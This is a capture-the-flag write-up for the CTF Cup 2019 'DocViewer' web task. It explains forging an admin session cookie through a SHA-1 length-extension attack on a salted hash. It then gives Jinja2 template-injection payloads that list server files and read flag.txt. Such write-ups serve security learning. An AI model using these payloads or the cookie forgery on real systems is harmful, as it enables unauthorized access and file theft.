# CTF Cup 2019 | Task-based – DocViewer

* **Category:** Web

## Challenge

> A large company can't live without their own service for document storing. I will never believe that somebody can read a document from other person or, God forbid, read files from the service.

### Author's repo (with task, solution and so on)

> https://github.com/HackerDom/ctfcup-2019-tb/tree/master/ideas/web/doc-viewer

## Solution

### 1) we need to login as admin to create and edit document

##### 1.1) send login request with empty username, we will get hash of of `HASH_SALT`

`hash(HASH_SALT) == 4e63fdb187d6465b6420f7677cf97b2c3b58014d`

##### 1.2) rewrite `_calculate_inner` with other initialization parametres

`hash() == A + B + C + D + E (where + is string concat)`

so


`A = 0x4e63fdb1`
`B = 0x87d6465b`
`C = 0x6420f767`
`D = 0x7cf97b2c`
`E = 0x3b58014d`


##### 1.3) call rewritten `_calculate_inner('admin')` and get valid admin hash (== admin_hash session cookie)

(by magic and luck we don't have to brute-force length of `HASH_SALT`)

`hash(HASH_SALT + admin) = 80320e5e0460b578a836a77ccd4fc682f3adb13a`

##### 1.4) set cookie 

### 2) find SSTI by fazzing

if we look to packets, what server send to us, (for example In Firefox > Network > some_packet > Headers > Server) we get to know, that servers uses `gunicorn/20.0.4`

so it is likely that server is written in python => we can try Jinja Injection

### 3) send payload

(taken from https://ctftime.org/writeup/11014)

Create documents with such content:

get list of files in $PWD
`{{url_for.__globals__.os.__dict__.listdir('./')}}`

find filename of flag and cat it
`{{url_for.__globals__.__builtins__.open('flag.txt').read()}}`
